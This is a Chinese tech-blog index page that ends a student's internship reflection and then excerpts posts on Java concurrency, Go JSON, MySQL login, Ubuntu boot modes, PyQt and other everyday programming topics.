五、实习总结和体会 实习总结：为期一天的实习就这样不知不觉的过去了。讲真的，很短暂，但是学到了很多的东西，是一次宝贵的学习机会。这看似简单的参观浏览交流将会成为之后我们毕业之后面试，或是参加工作的宝贵经验。总体来说本次的认知实习刷新了我们对自己所学专业的认知，同时也是刷新了我们对IT行业的认知。希望在之后的学习生活中自己还有这样和企业正面交流的机会。在享受充实的认知实习的同时，这次的实习由于种种原因也存在一定的不足。首先是自己准备不充分，没有抱着一个学习的心态去，等开始学习，开始认知时才转变心态。其次，对于参观宣讲的时候时候态度不够端正，有的重点知识没有进行记录，在回来后有一定的忘记。同时，由于班级比较多，参观的比较匆忙，时间上也不是很充分。虽然在细节上由于自己的疏忽和梯度问题存在一定的小问题，但是本次的认知实习中提上很好，达到了实习的目的，让同学们对自己未来职业的定位有了一个简单的了解，这是一趟充实而有意义的实习之旅。
心得体会：为期一天的实习结束了，看着两个公司精致的产品和漂亮的办公楼心里感慨万千。每个公司都是那样的出众，自己也希望经过几年的求学之路，自己也能够找到一份跟自己所学的专业挂钩的一份职业。再上班的同时提升自己。同时通过师兄师姐的就业有关问题的解答，也知道了很多面试时公司比较看重的东西。所有用人单位对于招人，首先技术是第一位的，其次是你要拥有一种正能量，一种能够影响整个团队，整个公司的正能量，能够带着他们学习。计算机行业是一个即吃香又很苦的行业。吃香以为你是搞技术的，只要技术搞得好，能够踏踏实实的学号一门语言，那么得到一份有着客观收入的工作并不太难。但是结果是好的，求学之路却是艰难的，因为学一门计算机语言很简单，但是真正的想要将一门语言学的精通，能够在以后的实际开发中用到，真的很难。况且计算机专业不像其他的职业一样，只要你学会了某项技能，就能够一直吃香，计算的的发展和更新换代的速度是我们无法想象的。所以，我们需要不断的学习，不论是现在，还是之后入职之后，都需要不断的积累和学习。“问渠那得清如许，为有源头活水来”，所有能够在计算机领域立足的人，都是因为有着不断积极学习的态度和常年开发的经验。现在在校学习的我们也是如此，只有将所有有关的领域的基础打牢靠。在接收上课老师的知识的同时学会自己积极主动的学习。只有学会主动，学会积极才会在之后的计算机领域拥有自己的一席之地。除此之外，在实习的过程中看着公司的员工井井有条的办公秩序和快节奏的办公。也懂得了制度与规定，还有时间观念的重要性。在学校，不论是学习还是其他事情，时间安排相对宽松，也没有太大的制度方面的约束。但是将来我们不如社会，成为一家公司的员工后，简单的遵守制度和快节奏的办公是我们避免不了的过程。此次实习后，在日常的学习生活中也要比较严格的约束自己，加快做事学习的时间，提高做事的效率，在未就业之前提前锻炼自己。这次实习也让我从一个企业的角度认识了企业招聘计算机人才的一写看法和要求。过硬的专业知识在应聘时永远占第一位。其次是对求新知的主动性与个人的学习能力的要求。因为计算机行业本身就是这样一个行业。在这个领域单一永久的可用性知识是不存在的。随着计算机软硬件的更新换代，计算机领域的新技术，新知识都将是我们需要学习的，所以要求较为严格。在者就是你的团队协作能力。你自己一个人能够为公司带来利润是其次，如果能够带动一批人积极向上，那么将有更大的发展空间。同时，在学校获得的各项证书。考的国家级证书，以及参加各类项目的经验都是公司比较看重的，因此，在校期间积极参加各类证书的考试和参与各类项目也是重要的。认知实习是大学的重要经历，通过认知实习，让我对实际的计算机工作也有了新的认识，学到了很多在课堂上学不到的知识，也让我更加看清自己的不足之处。通过这次计算机实习，我对今后的学习、发展方向有了更进一步的认识：学习不仅仅学的是理论知识，更重要的是学习如何将理论知识应用于实践，学习将工作做到尽善尽美。之后的学习生活过程中我们也将严格要求自己，学习和生活中充实自己，为自己的一份理想职业而奋斗。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e3adc204c0723b0bad0d03e6c5c0694e/" rel="bookmark">
			java多线程协同
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概述 并发协同就是多个线程共同完成一件事情，主要的实现方式就是根据实际情况堵塞某些线程，等待某些线程完成一定的工作之后再执行。
协同主要方法 基础传统的Synchronized及Object的wait，notify，notifyAll等方法基于lock和Condition的wait使用并发的工具类，可以很方便灵活的实现线程的并发协同 协同要思考的问题 什么地方需要协同什么线程在什么时候需要等待 常用API（java并发包中的） CountDownLatch CountDownLatch是一个倒数的计数器，初始化时设置一个值，子线程完成后，计数器归零时则不再阻塞。这样可以保证在一定数量的线程执行完毕后再执行后续的操作。
主要用法 构造函数CountDownLatch(int count)，指定等待线程的数量等待方法await();当计数大于0时会阻塞线程，计数为0时不会阻塞条件完成减数方法countDown();boolen await(long timeout,TimeUnit unit)设置等待的最大时长，返回true表示count清0了，false表示count不为0，但时间到了long getCount(),获取当前的计数 使用示例 public static void main(String[] args) throws InterruptedException { CountDownLatch latch=new CountDownLatch(5); String[] names=new String[]{"1号","2号","3号","4号","5号"}; for(int i=0;i&lt;5;i++){ new Thread(new Runnable() { @Override public void run() { try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); }//阻塞3s System.out.println("我是"+Thread.currentThread().getName()+"已经到达"); latch.countDown(); } },names[i]).start(); } latch.await(); System.out.println("所有人都到齐了"); } 输出结果：
我是5号已经到达 我是3号已经到达 我是1号已经到达 我是4号已经到达 我是2号已经到达 所有人都到齐了 CyclicBarrier 循环屏障 指定要协同的线程数量，并构成一个屏障，让线程在这个屏障前等待，当等待的数量达到设置值时，屏障放开。放开后又可重新使用，所以是循环屏障。与CountDownLatch都能设置固定数量的线程协同，但是CountDownLatch是做减法，减完之后就没了，CyclicBarrier是做加法，加到一定数量放开屏障并能循环使用。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e3adc204c0723b0bad0d03e6c5c0694e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/56ba4214675596bbaf6d40a2f1e0ea18/" rel="bookmark">
			ant design 中 getFieldDecorator 采坑记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 坑一：
报错：Cannot read property 'getFieldDecorator' of undefined
解决方法：
Form.create()(Questionary) // 用Form.create()加一层
2. 坑二
报错：'form' is missing in props validation react/prop-types
原因： 加了代码检查工具eslint
解决办法：
第一步： import PropTypes from 'prop-types'； 第二步： form: PropTypes.any 3. 坑三 怎么在组件中使用 getFieldDecorator
第一步：父级组件中这么写：需要用&lt;Form&gt;&lt;/Form&gt;嵌套一下
第二步：子组件这么用：
ShowTextArea () { const data = this.props.data const validRules = data.textValidate const { getFieldDecorator } = this.props.form return &lt;FormItem key={data.id}&gt; {getFieldDecorator(`textareaValue`, { initialValue: validRules.initVal, // 默认文本 rules: [{ required: true, message: validRules.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/56ba4214675596bbaf6d40a2f1e0ea18/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6282c7eef161246c3276eb988bf9ea3/" rel="bookmark">
			第二期学习总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、json Unmarshal struct中如果变量首字母是小写的，那么unmarshal后的值都是空的，所以struct的变量首字母必须大写。
package main import ( "encoding/json" "fmt" ) type data struct { Age int `json:"age"` Name string `json:"name"` EngineType string `json:"engineType"` ConnectType string `json:"connectType"` id int `json:"id"` } func main() { testStr := `{"age":1,"name":"john","engineType":"MUBU","size":"json", "id": 2}` var err error mydata := data{} err = json.Unmarshal([]byte(testStr), &amp;mydata) if err != nil { fmt.Printf("unmarshal err:%s", err) } fmt.Printf("mydata:\n%+v\n", mydata) } 打印结果
mydata: {Age:1 Name:john EngineType:MUBU ConnectType: id:0} 所以在json反序列化为struct时，struct中多一些变量或者json中多一些变量都没有关系，不会报错，unmarshal只会把符合定义的规则的变量反序列化出来塞进struct中
2、go get命令 使用场景：对于没有vendor的工程，编译发现缺少很多编译包，可以采用go get -u -v "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b6282c7eef161246c3276eb988bf9ea3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83df48fc265857ebd952250625523989/" rel="bookmark">
			AD操作小技巧总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、群操作修改元器件属性 使用寻找相同的元器件来统一修改值，最重要一步是找到后用shift选中你需要的那几个，修改完后按enter键即可。根据下图可以知道筛选的条件有很多，也可以从不同的文件中去寻找元器件。
2、将PCB中元器件旋转任意角度，注意三种不同的标志的旋转，第一个是Component。 3、将PCB中所有的元件的信息导出来 附：AD使用操作的快捷键大全：http://blog.sina.com.cn/s/blog_15dea7e4e0102wcg3.html
4、在PCB中的鼠标选中多个元件进行块操作，在move的情况下，加上L——&gt;放置元件到前后面板。 5、在PCB中按住Ctrl＋点上相应的引脚，高亮显示与其有电气连接的所有引脚。在Ctrl＋点击，退出该模式，不用重复按clear。 6、元件或者元件块镜像 1. 输入法切换至英文状态 2. 选中该器件后，鼠标左键按住元件不放，鼠标呈十字状，器件为可移动状态。 3. 此时按住键盘上的X或Y，X为水平左右翻转；Y为垂直上下翻转。 7、如何块操作隐藏PCB中元件的名称与参数 在PCB界面中，选中任意一个器件，右键，选择第一项（查找相似物体），然后出来一个对话框，在COMPONENS项后面选择SAME,然后点击下面的应用，再点确定，又出来一个对话框，找到SHOW NAME,和SHOW COMPENT两项，把后面的沟去掉就可以了。
8、使得叠在一起的元件快速的分开 选中这些器件，右击鼠标，选择align，或者选中器件，使用快捷键a，自动弹出align框，使用align left(maintain spacing)，或者align left(maintain spacing)，align top(maintain spacing),align bottom(maintain
spacing)就能将这些器件按照一定间距分开排列了。
9、E+W（快速切断线） 10、在PCB的布局中往往要多种花样的选择不同的元器件，下面介绍几种常见的选择方式： 框选（SI）、反选（SO）、线选（SL）、选择相同的网络（SN）——可以不用前面的Ctrl+选中的方法了
单独多选（ST）“超级有用哦”
11、Net的管理和颜色的高亮显示 这个对复杂的电路图的连线很有帮助
12、画PCB板子的时候，加上定位孔，直径在4mm左右（可自定） P+C快捷键画圆
Q的快捷键是切换单位
13、网络Class的管理与设计 将不同类型的元器件按照特征分类（D+C）如：net；component
14、鼠线的开启与关闭 在PCB中按快捷键N，或者在PCB-PCB的net设计中点击右键的connection中选择设计方式
15、特殊的复制（以及操作阵列复制的方法） 16、泪滴添加和删除 TE快捷键
17、最重要的点：电路设计规则 D+R
18、PCB的检查与生产输出 DRC检测（TOOL+Designe Rule Check）快捷键T+D
1、电气性能、Routing（阻抗线和过孔、差分线检测）
2、Stub线头检查（在manufacturing）
3、Placement（器件高度）
19、生产文件的输出 Fabrication output文件中选择光绘文件和转孔文件
20、导出文件说明 File中的Smart PDF里，对电路板的装配图和可以进行设计，输出的元素以及层数等。
电路图导出元件PDF以及元件清单：https://blog.csdn.net/tang_chuanlin/article/details/79488115
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b74fbae6772648f131079d297d04c41e/" rel="bookmark">
			getX(),getY()等方法的区别（图解）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上图中标注的方法可以分为两类，一类是View提供的方法，一类是MotionEvent提供的方法。分别说明如下：
View提供的获取的坐标以及距离的方法：
getTop() 获取到的是view自身的顶边到其父布局顶边的距离
getLeft() 获取到的是view自身的左边到其父布局左边的距离
getRight() 获取到的是view自身的右边到其父布局左边的距离
getBottom() 获取到的是view自身底边到其父布局顶边的距离
MotionEvent提供的方法：
getX() 获取点击事件距离控件左边的距离，即视图坐标
getY() 获取点击事件距离控件顶边的距离，即视图坐标
getRawX() 获取到的是点击事件距离整个屏幕左边的距离，即绝对坐标
getRawY() 获取到的是点击事件距离整个屏幕顶边的距离，即绝对坐标
getScrollY() 获取 视图坐标原点 到 视图 滚出屏幕 的水平距离
getScrollX() 获取 视图坐标原点 到 视图 滚出屏幕 的竖直距离
偶然间看到一张图，挺形象
如果向左移动 getScrollX()为正 如果向右移 getScrollX()为负 getScrollX()=0 - 移动后的X坐标
如果向上移动 getScrollY()为正 如果向下移 getScrollY()为负 getScrollY()=0 - 移动后的Y坐标
应用场景：
列表数据滑动删除时
View中还有其他的方法，后期再做总结
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0bbde4cbbf30c58b79312a42ca03e10e/" rel="bookmark">
			转载：~面试题：Kafka、ActiveMQ、RabbitMQ、RocketMQ 有什么优缺点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		面试题 1.为什么使用消息队列？
2.消息队列有什么优点和缺点？
3.Kafka、ActiveMQ、RabbitMQ、RocketMQ 都有什么区别，以及适合哪些场景？
面试官心理分析 其实面试官主要是想看看：
第一，你知不知道你们系统里为什么要用消息队列这个东西？
不少候选人，说自己项目里用了 Redis、MQ，但是其实他并不知道自己为什么要用这个东西。其实说白了，就是为了用而用，或者是别人设计的架构，他从头到尾都没思考过。
没有对自己的架构问过为什么的人，一定是平时没有思考的人，面试官对这类候选人印象通常很不好。因为面试官担心你进了团队之后只会木头木脑的干呆活儿，不会自己思考。
第二，你既然用了消息队列这个东西，你知不知道用了有什么好处&amp;坏处？
你要是没考虑过这个，那你盲目弄个 MQ 进系统里，后面出了问题你是不是就自己溜了给公司留坑？你要是没考虑过引入一个技术可能存在的弊端和风险，面试官把这类候选人招进来了，基本可能就是挖坑型选手。就怕你干 1 年挖一堆坑，自己跳槽了，给公司留下无穷后患。
第三，既然你用了 MQ，可能是某一种 MQ，那么你当时做没做过调研？
你别傻乎乎的自己拍脑袋看个人喜好就瞎用了一个 MQ，比如 Kafka，甚至都从没调研过业界流行的 MQ 到底有哪几种。每一个 MQ 的优点和缺点是什么。每一个 MQ 没有绝对的好坏，但是就是看用在哪个场景可以扬长避短，利用其优势，规避其劣势。
如果是一个不考虑技术选型的候选人招进了团队，leader 交给他一个任务，去设计个什么系统，他在里面用一些技术，可能都没考虑过选型，最后选的技术可能并不一定合适，一样是留坑。
面试题剖析 为什么使用消息队列 其实就是问问你消息队列都有哪些使用场景，然后你项目里具体是什么场景，说说你在这个场景里用消息队列是什么？
面试官问你这个问题，期望的一个回答是说，你们公司有个什么业务场景，这个业务场景有个什么技术挑战，如果不用 MQ 可能会很麻烦，但是你现在用了 MQ 之后带给了你很多的好处。
先说一下消息队列常见的使用场景吧，其实场景有很多，但是比较核心的有 3 个：解耦、异步、削峰。
解耦
看这么个场景。A 系统发送数据到 BCD 三个系统，通过接口调用发送。如果 E 系统也要这个数据呢？那如果 C 系统现在不需要了呢？A 系统负责人几乎崩溃......
在这个场景中，A 系统跟其它各种乱七八糟的系统严重耦合，A 系统产生一条比较关键的数据，很多系统都需要 A 系统将这个数据发送过来。A 系统要时时刻刻考虑 BCDE 四个系统如果挂了该咋办？要不要重发，要不要把消息存起来？头发都白了啊！
如果使用 MQ，A 系统产生一条数据，发送到 MQ 里面去，哪个系统需要数据自己去 MQ 里面消费。如果新系统需要数据，直接从 MQ 里消费即可；如果某个系统不需要这条数据了，就取消对 MQ 消息的消费即可。这样下来，A 系统压根儿不需要去考虑要给谁发送数据，不需要维护这个代码，也不需要考虑人家是否调用成功、失败超时等情况。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0bbde4cbbf30c58b79312a42ca03e10e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f1de7a460efdbe43a22c58f645d606ec/" rel="bookmark">
			登录mysql数据库的几种方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		登录mysql数据库的几种方式
第1种 (通过mysql自带的客户端，MySQL 5.5 Command Line Client) 不推荐这种方式
注意：这种登录方式，只适用于root用户，不够灵活！(只适合于root用户登录，只限于root用户，以后我们可能还有很多其他的用户，那其他用户就无法用这种方式登录了，所以这种方式登录mysql数据库有局限性)，所以不推荐使用这种方式登录mysql数据库
退出登录，可以使用exit命令或者是ctrl + c 如下图：
第2种 (使用windows的dos命令窗口，使用mysql命令)推荐这种方式，如下截图：
win键 + r
再输入cmd
如下图：在dos窗口中输入命令mysql -h localhost -P 3306 -u root -proot
接下来，我给大家详细讲解一下mysql这个命令
mysql -h localhost -P 3306 -u root -proot
（1.）最前面的mysql你可以理解成一个关键字或者理解成一个固定的命令，是固定写法，类似于java、jdk中的javac命令或java命令
（2.）-h表示host,即主机的ip地址
（3.）-P表示port，端口，mysql数据库的默认端口是3306，当然啦，你可以自己改端口号，我这里没改端口号(注意：这是大写的字母P)
（4.）-u表示user用户名
(5.)-p表示password密码(注意：这是小写的字母p)
下面说说mysql这个命令的注意事项：
大写的P表示端口号，小写的p表示密码，大家记住了
大家要记住，小写的p表示密码，-p和密码之间一定不能有空格，其他的像-u，-h，-P之类的，是可以有空格的，也可以没有空格
注意：如果是本机的话，主机ip和端口号可以不写(即主机ip和端口号可以省略)，直接写成mysql -u root -proot
如果是本机，但是端口号你改成了其他的端口号，不是默认的3306了，比如你把端口号改成了6688，那你就加上端口号，即mysql -P 6688 -u root -proot
以下这3种语法都是正确的，我依次举例和截图演示
我这里用的用户名是root，密码也是root
语法1：mysql -h 主机ip地址 -P 端口号 -u 用户名 -p密码 （-h和主机ip地址之间有空格，-P和端口号之间有空格，-u和用户名之间有空格，-p和密码之间一定不能有空格）
mysql -h localhost -P 3306 -u root -proot
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f1de7a460efdbe43a22c58f645d606ec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fadb11c196c63a8a92d1cd08087c6cba/" rel="bookmark">
			离散正弦型变换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		版权声明：本文为原创文章，未经博主允许不得用于商业用途。
正弦型变换(DST) 离散正弦变换为离散变换的一种，其酉核矩阵元素基于正弦函数，建立在实数域上：
T i , k = 2 N + 1 s i n [ π ( i + 1 ) ( k + 1 ) N + 1 ] T_{i,k}=\sqrt{\frac{2}{N+1}}sin[\frac{\pi(i+1)(k+1)}{N+1}] Ti,k​=N+12​ ​sin[N+1π(i+1)(k+1)​]
哈特利变换(Hartley) 哈特利变换用一种最直接的方式将傅里叶变换映射到实数域中，其基函数为
c a s ( θ ) = c o s ( θ ) + s i n ( θ ) cas(\theta)=cos(\theta)+sin(\theta) cas(θ)=cos(θ)+sin(θ)
方波型变换 方波型变换为离散正弦变换的一种，相比于三角函数使用有限方波的叠加作为基函数，因此计算更快。
沃尔什系列变换 沃尔什系列变换包括沃尔什变换(Walsh)，哈达玛变换(Hadamard)和定序哈达玛变换。他们都选择最简单是数域{-1,1}，并且要求输入矩阵 N = 2 n N=2^{n} N=2n。这是因为 2 n 2^{n} 2n个±1刚好可以组成N个正交向量（任意两个基向量汉明距离为 2 n − 1 2^{n-1} 2n−1,在 [ 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fadb11c196c63a8a92d1cd08087c6cba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd14dbe53223919cda9124e92bb019bf/" rel="bookmark">
			Ubuntu 16.04纯文本界面、图形化界面切换方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载自：https://blog.csdn.net/davidhopper/article/details/79288573
一、图形、文本界面的简单切换 1、Ubuntu 16.04系统默认以图形化界面方式启动，进入图形化界面后，若要切换到纯文本界面，一般可以按“Ctrl + Alt + F1（或F2-F6）”快捷键，在文本终端中输入用户名、密码后登录即可。
2、可以按 Ctrl + Alt + F7 进入图形界面。
3、在文本界面中，若需彻底关闭图形界面服务，则执行如下命令：
service lightdm stop 如果当前不是以“root”用户登录，则系统会要求输入超级权限密码，按提示输入即可。
当然，要重新开启图形界面服务，则输入如下命令：
service lightdm start 如果当前不是以“root”用户登录，系统同样会要求输入超级权限密码，按提示输入即可。
若要从文本界面切换回图形化界面，按下“Ctrl + Alt + F7”快捷键即可。
二、图形化界面下，修改系统登录界面为文本界面的配置方法 从图形化界面动态切换到文本界面虽然方便，但仍然存在让系统直接启动进入纯文本界面的使用需求，例如：安装NVIDIA显卡驱动最好还是在系统启动直接进入纯文本界面的状态下完成。下面讲解在图形化界面下配置系统启动直接进入文本界面的方法。
首先，按下“Ctrl+Alt+T”快捷键，打开一个命令终端，使用vi编辑器修改此文件：/etc/default/grub （命令如下所示）。说句题外话，虽然在图形化界面下可以使用gedit编辑器，但修改配置文件还是建议使用vi，有两个原因：首先，简单的vi操作并不难；其次，在文本界面下gedit无法使用。
sudo vi /etc/default/grub 修改内容为：
将此行用“#”注释：GRUB_CMDLINE_LINUX_DEFAULT=“quiet splash”；
将GRUB_CMDLINE_LINUX="" 修改为：GRUB_CMDLINE_LINUX=“text”；
将#GRUB_TERMINAL=console前的“#”号去除，即反注释该行。
保存修改后的配置文件，重新回到命令行界面，按顺序执行如下命令（一次执行一条）：
sudo update-grub
sudo systemctl set-default multi-user.target
关闭其他程序，输入如下命令重启电脑：
shutdown -r now # 或者 sudo reboot 三、文本界面下，修改系统登录界面为图形化界面的配置方法 如果安装的是Ubuntu 16.04系统中文版，则在文本界面中汉字仍会显示为乱码。若以普通用户登录，需执行管理员权限命令“sudo”时，同样无法完成，错误原因显示为乱码（与第一部分描述的问题现象一致）。要将系统登录界面切换为图形化界面，可以使用如下两种方法：一是以root用户登录（如果系统未启用root用户，则使用方法二），再修改相关配置文件。二是执行命令：
init 5
进入图形化界面，再修改相关配置文件。题外话，启用root用户的方法为：在图形化界面下，按“Ctrl+Alt+T”快捷键打开一个命令终端窗口，输入如下命令：
sudo passwd root 这里以第一种方法修改配置文件，假定已经以root用户登录系统：
使用vi编辑器修改此文件：/etc/default/grub （命令如下所示）。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd14dbe53223919cda9124e92bb019bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/786447974d27ea533120efad1c995aca/" rel="bookmark">
			system.currentTimeMillis() 获得当前的时间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		package java.lang;下的system类中的public static long currentTimeMillis(),
该方法的作用是返回当前的计算机时间，时间的表达格式为当前计算机时间和GMT时间(格林威治时间)1970年1月1号0时0分0秒所差的毫秒数。 和 new Date().getTime()获取的时间戳相同；
可以直接把这个方法强制转换成date类型。
1、 long currentTime = System.currentTimeMillis();
SimpleDateFormat dateFormatter = new SimpleDateFormat("yyyy年-MM月dd日-HH时mm分ss秒");
Date date = new Date(currentTime);
System.out.println(dateFormatter.format(date));
2、 long totalSeconds = totalMilliSeconds / 1000; 转换为秒
//求出现在的秒 long currentSecond = totalSeconds % 60;
//求出现在的分
long totalMinutes = totalSeconds / 60;
long currentMinute = totalMinutes % 60;
//求出现在的小时
long totalHour = totalMinutes / 60;
long currentHour = totalHour % 24;
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2067c66635508364574192b2e7ca6fce/" rel="bookmark">
			QGraphicsView 实现图片裁剪功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本教程实现了图片显示、滚轮放大缩小图片、鼠标中键移动图片、画框裁剪图片功能。
界面程序 from PyQt5.QtCore import QSize, Qt, QRect from PyQt5.QtGui import QColor from PyQt5.QtWidgets import QApplication, QDialog, QGridLayout, QPushButton, QSpacerItem, QSizePolicy try: from .graphics import GraphicsView, GraphicsPixmapItem except: from graphics import GraphicsView, GraphicsPixmapItem class Form(QDialog): def __init__(self): super(Form, self).__init__() self.resize(1024, 768) self.picture = r'test.png' self.init_ui() # 视图背景颜色 self.graphicsView.setBackgroundBrush(QColor(28, 31, 34)) self.graphicsView.save_signal.connect(self.pushButton_save.setEnabled) self.pushButton_cut.clicked.connect(self.pushButton_cut_clicked) self.pushButton_save.clicked.connect(self.pushButton_save_clicked) # image_item = GraphicsPolygonItem() # image_item.setFlag(QGraphicsItem.ItemIsMovable) # self.scene.addItem(image_item) def init_ui(self): self.gridLayout = QGridLayout(self) self.pushButton_cut = QPushButton('cut', self) self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2067c66635508364574192b2e7ca6fce/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0b0efe89cd3ce9d5b58eb7f56f0b4025/" rel="bookmark">
			STM32F103 开发（FreeRTOS）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		4，操作系统
个人认为如果资源允许，还是尽量上操作系统吧。这样起码对技术提升有好处。因为ST官方对FreeRTOS的严重支持，再加上我以前用过它，所以FreeRTOS是我最好的选择。从功能定位来看FreeRTOS和STM32芯片都有点吊丝气质，一路货色，确实挺般配的。
FreeRTOS :https://www.freertos.org/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8dea90581554ec6c0f1b1f27c5681d79/" rel="bookmark">
			基于Python/PYQT5的动物识别专家系统（人工智能实验）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于Python/PyQT5的动物识别专家系统（人工智能课程实验） 本学期人工智能实验课要求完成一个动物识别专家系统。 功能：推理显示结论；添加规则；推理失败弹框提示。 本文采用Python+PyQT5去完成GUI的设计和程序编写。 一、系统主要逻辑： 逻辑：
（1）用户输入已知事实—&gt;点击推理
（2）获取输入的已知事实 加入 综合数据库DB
（3）获取规则库，将前提和结论分别存储在两个列表中命名为P和q，存在对应关系
（4）将前提和已知事实库进行匹配：
如果存在一条前提，全部都出现在已知事实中，那么至少可以得出一个结论。将此结论加入综合数据库，将推理过程进行标记。存在一个推理列表中，其中存的数字为推理出来的前提和结论下标。用于显示。
如果不存在这样的前提，就说明一条中间结论也推不出来，跳转（6）
（5）等循环完了，因为至少存在一个中间结论，所以直接输出推理过程和（中间或者最终）结论。
（6）提示用户什么也不能推出来，询问是否进行补充，如果选择是就回到主页面，如果选择否就关闭程序，跟用户拜拜。界面设置：
框:输入事实的框，显示推理过程的框，显示结论的框，自动显示当前规则库的框，用来添加规则库的框。
按钮：点击进行推理的按钮，点击添加规则库并更新当前窗口的按钮
对话提示框：询问是否进行补充的框，跟用户拜拜的框。 界面：
二、系统主要代码部分： #推理部分的代码 def inference(self): #推理 input=self.textEdit.toPlainText() #获取输入的事实 input=input.split('\n') DB=set(input)#将综合数据库以集合的形式存放 [P,Q]=get_rules() #获取规则库 self.process='' #用于存储推理过程 self.animal='' #存储结论 #下面开始正式推理 flag=0 for premise in P: #对前提条件进行遍历 if ListInSet(premise, DB): #能够找到一个前提条件全部存在于数据库 DB.add(Q[P.index(premise)]) # 把结论放入综合数据库 self.animal=Q[P.index(premise)]#更新结论 self.process+= "%s --&gt; %s\n" % (premise, Q[P.index(premise)]) flag=1#至少有一个能够推出来的结论 if flag==0: #一个结论也推不出来，询问用户是否进行补充 self.alert_window.show() self.alert_window.pushButton.clicked.connect(self.alert_window.close) self.alert_window.pushButton_2.clicked.connect(self.no) else: #flga!=0说明有结论生成 #显示出推理过程 self.textEdit_2.setText(self.process) #显示出结论 self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8dea90581554ec6c0f1b1f27c5681d79/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/249114bb86fe8e02c90bb9901837f372/" rel="bookmark">
			javascript中十六进制和ASCII码互相转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		//ASCII码转16进制
function strToHexCharCode(str) { if (str === "") { return ""; } else { var hexCharCode = []; hexCharCode.push("0x"); for (var i = 0; i &lt; str.length; i++) { hexCharCode.push((str.charCodeAt(i)).toString(16)); } return hexCharCode.join(""); } } //十六进制转ASCII码 function hexCharCodeToStr(hexCharCodeStr) { var trimedStr = hexCharCodeStr.trim(); var rawStr = trimedStr.substr(0, 2).toLowerCase() === "0x" ? trimedStr.substr(2) : trimedStr; var len = rawStr.length; if (len % 2 !== 0) { alert("存在非法字符!"); return ""; } var curCharCode; var resultStr = []; for (var i = 0; i &lt; len; i = i + 2) { curCharCode = parseInt(rawStr.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/249114bb86fe8e02c90bb9901837f372/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ce03f3fa372e907ce83ec19300c0b34/" rel="bookmark">
			容器vector容量翻倍增长策略效率分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		很多语言的可动态变化容量的容器，其容量扩展一般是翻倍增长的策略，这里来分析一下翻倍增长策略的效率，以C++的vector容器为例。
我们不妨使用分摊复杂度分析：假设初始容量为一个常数N，连续执行n次insert()操作，最终size增长至N+n，根据算法策略，填装因子一直在(50%,100%]范围内，因此有：
size(n) ≤ capacity(n) &lt; 2*size(n)
其中，size(n)=N+n，考虑到N为一个极小的常数，因此size(n)=O(n)；再根据上面公式左边的等于号，得出：
capacity(n) = O(size(n)) = O(n) 考虑容量是按比例指数速度增长，共做过O(logn)次扩容达到capacity(n)，每次扩容消耗在复制元素上的时间正比于当时的规模(size)，且同样以2为比例做指数增长，因此消耗于扩容的时间累计不过：
T(n) = 2N + 4N + 8N +...+ capacity(n)
